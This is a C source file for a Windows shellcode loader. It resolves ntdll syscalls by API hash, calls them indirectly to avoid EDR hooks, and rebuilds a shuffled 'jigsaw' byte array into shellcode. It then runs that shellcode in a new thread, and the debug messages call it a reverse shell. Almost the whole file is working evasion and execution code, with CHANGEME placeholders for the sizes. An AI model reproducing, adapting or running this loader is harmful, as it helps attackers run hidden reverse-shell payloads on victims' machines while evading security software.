#include <Windows.h>


#include "ShellCodeLoader.h"
#include "WinApiReImplementations.h"

#pragma comment(linker, "/section:.data,RW")//.data section writable
//#pragma comment(linker, "/section:.data,RWE")//.data section executable

/*
* Define the functisons from Syscalls.asm.
* These definitions make the PrepareSyscall and DoIndirectSyscall functions accessible to ShellcodeLoader.c. 
*/ 

// we pass a DWORD instead of a word (some syscall IDs are 3 Bytes long)
//extern VOID PrepareSyscall(WORD wSystemCall);
extern VOID PrepareSyscall(DWORD wSystemCall, LPVOID pSystemCall);
// to use this without implicit return type, we need to convert from c++ to c
// not sure whether passing an implicit return type would actually work here, as differenct syscalls
// may return different return types (?)
extern DoIndirectSyscall();
unsigned char shellcode_int3[CHANGEME] = { 0x00 };

/*
* Locate syscall information within ntdll
* arg0: base address of ntdll
* arg1: function name to resolve (e.g. NtCreateProcess) -> to be replaced by hash
* arg2: pointer to void*. This will be populated with the address of the syscall instruction for that function
* arg3: pointer to DWORD. This will be populated with the Syscall ID
* return: -1 / ERROR_SUCCESS.
*/
//NTSTATUS resolve_syscall(HMODULE hNtDll, LPCSTR funcName, _Out_ LPVOID *outpSyscall, _Out_ LPDWORD outSyscallId) {
NTSTATUS resolve_syscall(HMODULE hNtDll, DWORD function_hash, _Out_ LPVOID *outpSyscall, _Out_ LPDWORD outSyscallId) {
    // tbd: Avoid GPA and use API hashes. 
    // See https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware for a copy-paste ready implementation of GPA
    //LPVOID pProc = (LPVOID)GetProcAddress(hNtDll, funcName);
    LPVOID pProc = GetProcAddressByHash(hNtDll, function_hash);
    if (pProc == NULL) {
        DEBUG_PRINT("GetProcAddressByHash failed for 0x%x\n", function_hash);
        return (NTSTATUS) -1;
    }
    

    DEBUG_PRINT("Function for hash 0x%x at %p\n", function_hash, pProc);
    /*
    0:000> uf ntdll!NtCreateProcess
    ntdll!NtCreateProcess:
    00007ffc`b3e10b10 4c8bd1          mov     r10,rcx
    00007ffc`b3e10b13 b8be000000      mov     eax,0BEh
    00007ffc`b3e10b18 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
    00007ffc`b3e10b20 7503            jne     ntdll!NtCreateProcess+0x15 (00007ffc`b3e10b25)  Branch

    ntdll!NtCreateProcess+0x12:
    00007ffc`b3e10b22 0f05            syscall
    00007ffc`b3e10b24 c3              ret
    */

    DWORD syscallId = 0;
    PBYTE ptr = (PBYTE)pProc;
    while (TRUE) {
        // 0xb8 => mov eax, ...
        if (*ptr == 0xb8) {
            syscallId = *(DWORD*)(ptr + 1);
        }
        // 0x0f05 => syscall
        else if (*ptr == 0x0f) {
            if (*(ptr + 1) == 0x05) {
                // 0xc3 => ret
                if (*(ptr + 2) == 0xc3) {
                    DEBUG_PRINT("Syscall for 0x%x at %p. ID: %02x\n", function_hash, ptr, syscallId);
                    *outSyscallId = syscallId;
                    *outpSyscall = ptr;
                    return ERROR_SUCCESS;
                }
            }
        }

        // prevent an endless loop
        if ((ptr - (PBYTE)pProc) == 50) {
            DEBUG_PRINT("Could not identify Syscall for 0x%x\n", function_hash);
            return (NTSTATUS)-1;
        }
        ptr++;
    }
}

/*
* populate the SYSCALL_INFO_TABLE by resolving the individual syscall information 
* If you'd like to add more syscalls, change the SYSCALL_INFO_TABLE struct within ShellCodeLoader.h and add calls to resolve_syscall as below
* arg0: Base address of ntdll
* arg1: Pointer to SYSCALL_INFO_TABLE struct - This is populated with the actual syscall information
* return: ERROR_SUCCESS (success) or -1 (failure)
*/

NTSTATUS populate_syscall_table(HMODULE hNtDll, _Out_ PSYSCALL_INFO_TABLE pSyscallTable) {
    //LPCSTR funcName = "NtAllocateVirtualMemory";
    NTSTATUS status = (NTSTATUS)-1; 
    //status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtAllocateVirtualMemory.pSyscall, &pSyscallTable->NtAllocateVirtualMemory.syscallId);
    status = resolve_syscall(hNtDll, pSyscallTable->NtAllocateVirtualMemory.functionHash, &pSyscallTable->NtAllocateVirtualMemory.pSyscall, &pSyscallTable->NtAllocateVirtualMemory.syscallId);
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Failed to resolve Syscall for 0x%x!", pSyscallTable->NtAllocateVirtualMemory.functionHash);
      return (NTSTATUS)-1;
    }

    //funcName = "NtProtectVirtualMemory";
    //status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtProtectVirtualMemory.pSyscall, &pSyscallTable->NtProtectVirtualMemory.syscallId);
    status = resolve_syscall(hNtDll, pSyscallTable->NtProtectVirtualMemory.functionHash, &pSyscallTable->NtProtectVirtualMemory.pSyscall, &pSyscallTable->NtProtectVirtualMemory.syscallId);
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Failed to resolve Syscall for 0x%x!", pSyscallTable->NtProtectVirtualMemory.functionHash);
        return (NTSTATUS)-1;
    }

    //funcName = "NtCreateThreadEx";
    //status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtCreateThreadEx.pSyscall, &pSyscallTable->NtCreateThreadEx.syscallId);
    status = resolve_syscall(hNtDll, pSyscallTable->NtCreateThreadEx.functionHash, &pSyscallTable->NtCreateThreadEx.pSyscall, &pSyscallTable->NtCreateThreadEx.syscallId);
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Failed to resolve Syscall for 0x%x!", pSyscallTable->NtCreateThreadEx.functionHash);
        return (NTSTATUS)-1;
    }

    //funcName = "NtWaitForSingleObject";
    //status = resolve_syscall(hNtDll, funcName, &pSyscallTable->NtWaitForSingleObject.pSyscall, &pSyscallTable->NtWaitForSingleObject.syscallId);
    status = resolve_syscall(hNtDll, pSyscallTable->NtWaitForSingleObject.functionHash, &pSyscallTable->NtWaitForSingleObject.pSyscall, &pSyscallTable->NtWaitForSingleObject.syscallId);
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Failed to resolve Syscall for 0x%x!", pSyscallTable->NtWaitForSingleObject.functionHash);
        return (NTSTATUS)-1;
    }

    return ERROR_SUCCESS;

}

/*
* Execute shellcode using indirect syscalls (copied from https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L166)
* arg0: pointer to syscall table. The syscallId and pSyscall members are used in PrepareSyscall
* arg1: shellcode
* return: ERROR_SUCCESS (success) / -1 (failure)
* Call stack:
*   * NtAllocateVirutalMemory
*   * memcpy (basically)
*   * NtProtectVirtualMemory
*   * NtCreateThreadEx
*   * NtWaitForSingleObject
*/
NTSTATUS execute_shellcode_create_thread(PSYSCALL_INFO_TABLE pSyscallTable, const CHAR shellcode[], size_t shellcode_len) {
    NTSTATUS status = 0x00000000;
    DEBUG_PRINT("Executing shellcode\n");
    
    // Allocate memory for the shellcode
    PVOID lpAddress = NULL;
    SIZE_T sDataSize = shellcode_len;
    PrepareSyscall(pSyscallTable->NtAllocateVirtualMemory.syscallId, pSyscallTable->NtAllocateVirtualMemory.pSyscall);
    status = DoIndirectSyscall((HANDLE)-1, &lpAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
    
    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("NtAllocateVirtualMemory failed!");
        return (NTSTATUS)-1;
    }

    DEBUG_PRINT("Allocated memory at %p\n", lpAddress);

    // Write shellcodde
    MoveMemoryReImpl(lpAddress, (const PVOID)shellcode, shellcode_len);

    // make page executable
    ULONG ulOldProtect = 0;
    PrepareSyscall(pSyscallTable->NtProtectVirtualMemory.syscallId, pSyscallTable->NtProtectVirtualMemory.pSyscall);
    status = DoIndirectSyscall((HANDLE)-1, &lpAddress, &sDataSize, PAGE_EXECUTE_READ, &ulOldProtect);

    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("NtProtectVrirtualMemory failed!");
        return (NTSTATUS)-1;
    }

    DEBUG_PRINT("NtProtectVrirtualMemory success!\n");

    // Create thread
    HANDLE hHostThread = INVALID_HANDLE_VALUE;
    PrepareSyscall(pSyscallTable->NtCreateThreadEx.syscallId, pSyscallTable->NtCreateThreadEx.pSyscall);
    status = DoIndirectSyscall(&hHostThread, 0x1FFFFF, NULL, (HANDLE)-1, (LPTHREAD_START_ROUTINE)lpAddress, NULL, FALSE, NULL, NULL, NULL, NULL);

    if ( (status != ERROR_SUCCESS) || (hHostThread == INVALID_HANDLE_VALUE) ) {
        DEBUG_PRINT("NtCreateThreadEx failed!");
        return (NTSTATUS)-1;
    }

    DEBUG_PRINT("NtCreateThreadEx success. hThread: %p\n", hHostThread);

    // Wait for 1 second & execute
LARGE_INTEGER Timeout;
Timeout.QuadPart = -10000000;
while (TRUE) {
    // Prepare for and perform the syscall to wait on the thread
    PrepareSyscall(pSyscallTable->NtWaitForSingleObject.syscallId, pSyscallTable->NtWaitForSingleObject.pSyscall);
    status = DoIndirectSyscall(hHostThread, FALSE, &Timeout);

    if (status == STATUS_WAIT_0) {
        DEBUG_PRINT("Reverse shell thread has completed its execution.\n");
        break; // Exit the loop if the thread has signaled completion
    }
    else if (status == STATUS_TIMEOUT) {
        DEBUG_PRINT("Still executing the reverse shell thread...\n");
        // The thread is still running; the main program can continue to wait or perform other tasks
        // Optionally, this is a good place to check for other conditions to continue waiting or not
    }
    else {
        DEBUG_PRINT("NtWaitForSingleObject Failed with status: %x\n", status);
        break; // An error occurred; handle accordingly
    }
    // Adjust the timeout for your next wait period as necessary. 
    // This loop will continue to keep the program alive, checking on the thread at each interval.
}
}

// Entrypoint
int main()
{
    /*
    // GMH not needed any longer
    HMODULE hNtDll = GetModuleHandle(L"ntdll.dll");
    */
    HMODULE hNtDll = GetModuleHandleByHash(0x22d3b5ed);
    if (hNtDll == NULL) {
        DEBUG_PRINT("GetModuleHandle failed for ntdll!\n");
        return -1;
    }

    DEBUG_PRINT("NtDll mapped to %p\n", hNtDll);

    /*
    * Just a test to make sure it works for other modules as well
    HMODULE hKernel32 = GetModuleHandle(L"kernel32.dll");
    HMODULE hKernel322 = GetModuleHandleByHash(0x6ddb9555);
    DEBUG_PRINT("kernel32: %p / %p\n", hKernel32, hKernel322);
    */
    
    DEBUG_PRINT("sizeof shellcode: %d\n", (int)sizeof(shellcode_int3));
    
    /*
    * C:\Users\joshua\Desktop\ShellCodeLoader_Indirect_Syscalls>"C:\Program Files\Python311\python.exe" create_api_hashes.py
    * string: ntdll.dll, hash: 0x22d3b5ed
    * string: NtAllocateVirtualMemory, hash: 0x6793c34c
    * string: NtProtectVirtualMemory, hash: 0x82962c8
    * string: NtCreateThreadEx, hash: 0xcb0c2130
    * string: NtWaitForSingleObject, hash: 0x4c6dc63c
    */
    SYSCALL_INFO_TABLE syscalls = { 0 };
    syscalls.NtAllocateVirtualMemory.functionHash = 0x6793c34c;
    syscalls.NtProtectVirtualMemory.functionHash = 0x82962c8; 
    syscalls.NtCreateThreadEx.functionHash = 0xcb0c2130;
    syscalls.NtWaitForSingleObject.functionHash = 0x4c6dc63c; 

    NTSTATUS status = populate_syscall_table(hNtDll, &syscalls); 

    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Error populating Syscall table!\n");
        return -1;
    }
    unsigned char jigsaw[CHANGEME] = { 0x36, 0x56, 0x58, 0x83, 0x18, 0x37, 0x89, 0x96, 0x00, 0x6a, 0x07, 0x77, 0x5a, 0xe8, 0x02, 0x0b, 0x32, 0x5e, 0x50, 0xc1, 0x48, 0xba, 0xba, 0x54, 0x41, 0x89, 0x65, 0xc1, 0xc7, 0x6b, 0x48, 0xd0, 0x48, 0xff, 0x53, 0x6a, 0x48, 0x00, 0x00, 0xc0, 0x46, 0x75, 0x2e, 0x6c, 0x38, 0x48, 0x47, 0x85, 0x01, 0x83, 0x53, 0x58, 0x48, 0xff, 0x6a, 0x4c, 0x68, 0x66, 0x4d, 0x79, 0x9e, 0xe0, 0x8b, 0x71, 0xc7, 0x00, 0x44, 0x39, 0x44, 0x59, 0xd2, 0x40, 0x67, 0x33, 0xc4, 0x58, 0x00, 0x67, 0x53, 0x5a, 0x51, 0x58, 0x57, 0x44, 0x73, 0x02, 0x8b, 0x34, 0x74, 0x3b, 0x57, 0x56, 0x50, 0x00, 0x47, 0x00, 0x71, 0xff, 0x00, 0x6c, 0x5a, 0x4d, 0xff, 0x53, 0x8b, 0x00, 0x59, 0x74, 0x5a, 0x52, 0x4b, 0xc1, 0x71, 0x75, 0x7a, 0x85, 0x57, 0x00, 0xc1, 0xc0, 0xff, 0x66, 0x48, 0x7a, 0x00, 0x4b, 0x62, 0x0f, 0x00, 0xff, 0x58, 0x30, 0x41, 0x6e, 0x00, 0x57, 0x12, 0x67, 0x41, 0x49, 0xbe, 0x6a, 0x03, 0xc9, 0x56, 0x90, 0x04, 0xd5, 0x74, 0x4d, 0x48, 0x31, 0x48, 0x4b, 0x10, 0x37, 0x4c, 0xe0, 0x4d, 0x61, 0x12, 0x84, 0x6c, 0x48, 0x53, 0x3c, 0xe1, 0x43, 0x57, 0x77, 0x85, 0x8b, 0x52, 0xfc, 0xc0, 0x33, 0xd5, 0x34, 0x6b, 0x00, 0xff, 0x96, 0x31, 0x89, 0x76, 0xff, 0x32, 0x89, 0xd5, 0x41, 0x1f, 0x72, 0x24, 0x0f, 0x59, 0xf1, 0x77, 0x6b, 0x69, 0x53, 0x48, 0x75, 0x48, 0x24, 0x44, 0x00, 0xe2, 0x78, 0xc6, 0x46, 0x02, 0x58, 0x50, 0x53, 0xa7, 0x49, 0x74, 0x50, 0x49, 0x00, 0xc2, 0x8b, 0x8b, 0x4c, 0x4d, 0x6b, 0x46, 0x2d, 0x72, 0x65, 0x52, 0x66, 0x20, 0x52, 0x00, 0x50, 0x88, 0x8b, 0x31, 0x41, 0x56, 0xf9, 0xd5, 0x52, 0xe1, 0xe2, 0xd8, 0x37, 0xd5, 0xed, 0x45, 0x48, 0x26, 0xd5, 0x7a, 0x41, 0x2d, 0x00, 0xff, 0x73, 0x00, 0x78, 0x00, 0x49, 0x00, 0xe4, 0x32, 0x72, 0x04, 0x7a, 0x76, 0x79, 0x49, 0x00, 0x89, 0x69, 0x00, 0x6a, 0x49, 0x75, 0x47, 0xc7, 0xdb, 0x89, 0x00, 0x42, 0x53, 0x53, 0x52, 0x5a, 0x52, 0x31, 0x39, 0x5a, 0xa4, 0x44, 0x80, 0xd5, 0x71, 0xf9, 0x20, 0x48, 0x6a, 0xd5, 0x65, 0x41, 0x33, 0xda, 0x4d, 0x89, 0xc0, 0x9f, 0xff, 0x55, 0x31, 0x6e, 0x00, 0x4a, 0x77, 0x53, 0x5a, 0x34, 0x42, 0x06, 0xc2, 0x68, 0x36, 0xd0, 0x59, 0x48, 0x31, 0x2d, 0x6c, 0x34, 0xe0, 0x4d, 0x5a, 0xe2, 0x35, 0x01, 0x46, 0x48, 0x4a, 0x13, 0x41, 0x76, 0x65, 0x31, 0x38, 0x34, 0x52, 0x53, 0x71, 0x48, 0x89, 0x00, 0xba, 0xff, 0x55, 0xc7, 0xd3, 0x31, 0x49, 0x2e, 0x80, 0x64, 0x31, 0x88, 0xff, 0x69, 0x00, 0x01, 0xd5, 0x6c, 0x36, 0x35, 0x75, 0xdc, 0x53, 0x48, 0xcf, 0x62, 0x8b, 0x45, 0xaa, 0x41, 0x53, 0x44, 0x6a, 0xc9, 0xeb, 0x39, 0x30, 0x20, 0xf1, 0x4f, 0x00, 0x89, 0x00, 0x40, 0x85, 0x00, 0x71, 0x68, 0x4d, 0xc9, 0x72, 0xc0, 0x41, 0x00, 0x01, 0x0a, 0x42, 0xc1, 0x4b, 0x0d, 0x52, 0xff, 0x00, 0xe3, 0x89, 0xff, 0x34, 0x48, 0x65, 0x31, 0x68, 0x6d, 0x66, 0x78, 0xff, 0x0d, 0x34, 0x53, 0x48, 0x52, 0x18, 0x34, 0x36, 0x65, 0x00, 0x62, 0x49, 0xb7, 0x00, 0xc9, 0x4d, 0xf1, 0xd0, 0x49, 0x50, 0x50, 0x4f, 0x41, 0x78, 0x08, 0xeb, 0x28, 0xc9, 0x59, 0xd5, 0x51, 0x53, 0x56, 0x89, 0xd1, 0x01, 0x41, 0xe8, 0x41, 0x39, 0x2e, 0x31, 0x00, 0xe2, 0x30, 0x8b, 0x64, 0x40, 0x01, 0x00, 0xe0, 0x38, 0x66, 0x48, 0x85, 0x46, 0x2a, 0x8b, 0x49, 0xc9, 0x50, 0x58, 0x2f, 0x8b, 0x0c, 0x48, 0x0d, 0x89, 0x44, 0x44, 0xc7, 0x00, 0x77, 0x48, 0x00, 0x45, 0xe8, 0x74, 0x57, 0xc3, 0x04, 0xff, 0x01, 0x37, 0x20, 0x48, 0x53, 0x58, 0x30, 0xe9, 0x42, 0x00, 0xff, 0x51, 0xff, 0x54, 0xe7, 0x6a, 0x53, 0x34, 0x6a, 0x8b, 0x41, 0x56, 0xba, 0x72, 0x47, 0x42, 0xfb, 0xa8, 0xc2, 0x71, 0x66, 0x59, 0x00, 0x49, 0x5a, 0x89, 0x48, 0xc6, 0x52, 0xc0, 0x48, 0x47, 0x4b, 0xc9, 0x48, 0x50, 0x77, 0x48, 0x4d, 0x2d, 0x54, 0x31, 0xd0, 0xf1, 0x39, 0x51, 0x32, 0x1f, 0xe1, 0x88, 0x00, 0x36, 0x6b, 0x67, 0x48, 0x00, 0x6a, 0x68, 0x00, 0x48, 0x75, 0x41, 0x71, 0x01, 0xda, 0x00, 0x81, 0x2e, 0x31, 0x55, 0x46, 0x77, 0x53, 0x49, 0x35, 0xc9, 0x83, 0x46, 0x56, 0x31, 0x58, 0x53, 0x59, 0x58, 0x73, 0x49, 0x00, 0x73, 0x4a, 0x41, 0x55, 0x47, 0x20, 0x62, 0x69, 0x50, 0x41, 0x58, 0x44, 0xd5, 0x8b, 0x00, 0x3c, 0xba, 0x43, 0xe8, 0x31, 0x41, 0x4d, 0xc0, 0x00, 0x49, 0xac, 0x41, 0x74, 0x72, 0x58, 0x31, 0x48, 0x8b, 0x4a, 0x41, 0xc0, 0x89, 0x67, 0x6c, 0x89, 0x41, 0xc0, 0x36, 0x00, 0xcc, 0x64, 0x18, 0x51, 0x70, 0x48, 0x12, 0x52, 0x00, 0x53, 0xf1, 0x53, 0x00, 0xd0, 0x61, 0x00, 0xc1, 0x83, 0x5f, 0x64, 0x33, 0x0a, 0x57, 0xb8, 0x53, 0x53, 0x54, 0x72, 0x48, 0x38, 0x53, 0x65, 0xc9, 0xe0, 0x53, 0x00, 0x6a, 0x71, 0x18, 0x00, 0xf0, 0x89, 0x1c, 0x48, 0x89, 0x2f, 0x60, 0x00, 0x54, 0x48, 0x84, 0x49, 0xe5, 0x76, 0x2e, 0x49, 0x41, 0x00, 0xff, 0x48, 0x89, 0x5a, 0x78, 0x38, 0x36, 0x57, 0x50, 0x32, 0xba, 0x01, 0x57, 0x48, 0x6a, 0x6f, 0x45, 0x6d, 0x6d, 0x7c, 0x00, 0x4c, 0x4a, 0x59, 0x7b, 0xd0, 0x37, 0x89, 0x51, 0x50, 0x72, 0x40, 0xec, 0x6b, 0xd6, 0x00, 0x88, 0x49, 0x00, 0x77, 0x77, 0x00, 0x36, 0x48, 0x77, 0x75, 0x4d, 0x93, 0x3a, 0x75, 0xc1, 0x45, 0xff, 0x86, 0x68, 0x5a, 0x78, 0x75, 0x67, 0x48, 0x49, 0x73, 0x52, 0x0f, 0xbb, 0x89, 0x48, 0x33, 0x4a, 0x44, 0x20, 0x89, 0x73, 0xf0, 0x00, 0x55, 0x41, 0x53, 0x20, 0x00, 0x79, 0x6d, 0x54, 0x5a, 0xc7, 0xac, 0x74, 0x4a, 0x49, 0x5f, 0xc0, 0x46, 0x5d, 0x5a, 0x49, 0x00, 0x49, 0x2c, 0x8b, 0xc0, 0x41, 0x74, 0xba, 0x51, 0x31, 0x1d, 0x03, 0xc4, 0x00, 0x2d, 0xc9, 0x00, 0x58, 0x33 };

    int positions[CHANGEME] = { 461, 19, 179, 2, 664, 427, 290, 721, 814, 627, 240, 493, 193, 319, 695, 81, 421, 185, 13, 61, 771, 787, 719, 399, 480, 310, 473, 674, 293, 477, 231, 182, 648, 117, 505, 615, 74, 725, 795, 779, 382, 487, 602, 326, 438, 672, 378, 84, 127, 799, 770, 530, 126, 604, 813, 146, 523, 407, 643, 546, 635, 141, 34, 346, 673, 686, 350, 276, 104, 747, 17, 106, 99, 521, 800, 810, 94, 409, 541, 288, 486, 579, 348, 548, 555, 82, 164, 506, 227, 603, 309, 230, 36, 593, 484, 764, 367, 641, 88, 403, 249, 253, 809, 257, 89, 273, 815, 732, 462, 465, 516, 139, 420, 142, 571, 730, 433, 793, 134, 252, 666, 428, 180, 551, 685, 210, 325, 83, 753, 796, 757, 471, 229, 225, 314, 566, 788, 328, 59, 718, 220, 304, 305, 255, 261, 806, 176, 690, 559, 37, 109, 655, 289, 406, 752, 472, 144, 626, 414, 455, 720, 805, 466, 206, 769, 73, 233, 481, 534, 413, 802, 30, 67, 0, 47, 621, 825, 499, 468, 297, 728, 789, 275, 649, 349, 317, 418, 246, 729, 188, 671, 445, 147, 804, 186, 143, 347, 456, 222, 218, 194, 633, 741, 158, 388, 86, 791, 423, 608, 634, 52, 436, 542, 306, 263, 171, 98, 437, 708, 688, 661, 175, 168, 457, 654, 432, 476, 405, 362, 549, 345, 162, 54, 27, 272, 103, 91, 123, 652, 122, 389, 320, 318, 199, 710, 62, 153, 570, 797, 63, 547, 606, 239, 605, 344, 198, 434, 92, 692, 440, 266, 539, 321, 755, 640, 3, 587, 35, 628, 371, 525, 262, 777, 592, 716, 338, 678, 469, 624, 513, 560, 235, 217, 784, 586, 72, 411, 657, 31, 496, 14, 644, 454, 577, 758, 167, 90, 667, 478, 785, 32, 774, 711, 642, 353, 55, 398, 782, 385, 625, 645, 311, 213, 444, 216, 223, 794, 43, 439, 303, 740, 286, 368, 663, 599, 442, 361, 76, 453, 715, 251, 565, 333, 124, 201, 299, 451, 706, 531, 138, 518, 573, 44, 676, 713, 507, 501, 120, 374, 535, 342, 738, 504, 40, 778, 677, 680, 808, 474, 749, 743, 581, 659, 278, 620, 379, 512, 675, 268, 224, 622, 60, 766, 393, 396, 683, 670, 733, 576, 25, 693, 359, 108, 426, 697, 12, 759, 681, 540, 582, 600, 150, 557, 107, 614, 500, 751, 790, 687, 157, 668, 298, 554, 341, 352, 118, 85, 750, 163, 754, 172, 610, 401, 56, 483, 58, 618, 211, 93, 114, 574, 212, 419, 704, 446, 380, 511, 567, 450, 561, 824, 271, 377, 243, 612, 449, 110, 495, 280, 226, 87, 364, 502, 42, 763, 653, 580, 717, 102, 159, 337, 528, 558, 190, 79, 148, 696, 737, 656, 739, 269, 448, 646, 115, 775, 151, 112, 174, 698, 629, 410, 284, 16, 274, 723, 544, 66, 532, 745, 101, 591, 684, 503, 77, 45, 96, 383, 819, 22, 631, 301, 394, 714, 324, 207, 165, 584, 136, 742, 458, 475, 598, 702, 238, 1, 322, 149, 270, 331, 366, 811, 712, 807, 181, 460, 801, 780, 583, 812, 283, 209, 569, 8, 765, 11, 241, 360, 773, 563, 372, 373, 609, 105, 183, 384, 632, 422, 543, 489, 295, 588, 236, 340, 376, 204, 265, 783, 617, 709, 29, 312, 392, 803, 65, 514, 424, 39, 21, 459, 550, 129, 250, 662, 524, 300, 113, 650, 336, 402, 556, 616, 247, 177, 228, 429, 537, 527, 15, 762, 744, 330, 637, 245, 400, 821, 517, 75, 823, 792, 78, 329, 46, 601, 526, 479, 244, 748, 355, 135, 195, 529, 533, 130, 154, 256, 630, 189, 491, 258, 726, 497, 568, 578, 416, 339, 197, 343, 564, 594, 10, 184, 351, 242, 156, 315, 49, 259, 417, 5, 279, 178, 119, 97, 572, 679, 132, 746, 488, 395, 202, 254, 215, 26, 435, 137, 669, 772, 375, 441, 822, 203, 294, 285, 7, 6, 415, 80, 18, 412, 95, 208, 64, 639, 707, 776, 596, 313, 161, 50, 590, 291, 735, 611, 447, 536, 820, 522, 585, 248, 658, 408, 470, 100, 281, 302, 20, 57, 817, 595, 727, 390, 467, 28, 316, 682, 607, 170, 116, 722, 334, 24, 287, 363, 33, 589, 292, 760, 509, 282, 234, 133, 700, 200, 734, 705, 187, 482, 140, 404, 485, 397, 277, 756, 160, 335, 691, 430, 327, 520, 332, 699, 51, 323, 237, 552, 191, 665, 173, 386, 613, 70, 452, 490, 169, 196, 562, 128, 264, 125, 111, 638, 356, 494, 724, 545, 798, 221, 498, 651, 768, 260, 152, 575, 381, 689, 636, 619, 647, 387, 365, 515, 767, 219, 508, 23, 41, 816, 232, 166, 443, 358, 155, 296, 781, 553, 4, 9, 538, 69, 703, 68, 701, 391, 369, 463, 205, 660, 48, 519, 370, 597, 425, 131, 492, 214, 354, 786, 623, 307, 53, 71, 731, 192, 694, 308, 464, 38, 818, 145, 736, 267, 357, 121, 761, 510, 431 };


    int calc_len = CHANGEME;
    int position;

    // Reconstruct the payload
    for (int idx = 0; idx < sizeof(positions) / sizeof(positions[0]); idx++) {
    position = positions[idx];
    shellcode_int3[position] = jigsaw[idx];
    }
    status = execute_shellcode_create_thread(&syscalls, shellcode_int3, sizeof(shellcode_int3));

    if (status != ERROR_SUCCESS) {
        DEBUG_PRINT("Error executing shellcode!\n");
        return -1;
    }
        
    DEBUG_PRINT("YAY");
    return ERROR_SUCCESS; 
}

